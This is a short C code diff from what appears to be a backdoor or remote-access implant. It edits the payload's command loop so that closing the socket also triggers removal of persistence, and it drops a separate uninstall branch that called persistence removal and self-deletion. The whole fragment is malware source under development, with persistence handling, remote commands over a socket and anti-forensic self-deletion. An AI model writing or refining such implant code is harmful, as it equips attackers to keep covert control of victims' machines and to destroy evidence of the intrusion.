@@ -200,23 +200,13 @@ int main_payload_improved(void) {
                     socket_close(sock);
                     socket_cleanup();
                     
+                    // Remove persistence
+                    remove_persistence();
+                    
                     // Self-destruct (optional)
 #ifdef ENABLE_SELF_DESTRUCT
                     delete_self();
 #endif
-                    return 0;
-                }
-                
-                // Check for uninstall
-                if (cmd->cmd_id == CMD_UNINSTALL) {
-                    socket_close(sock);
-                    socket_cleanup();
-                    
-                    // Remove persistence
-                    remove_persistence();
-                    
-                    // Delete self
-                    delete_self();
                     return 0;
                 }
             }
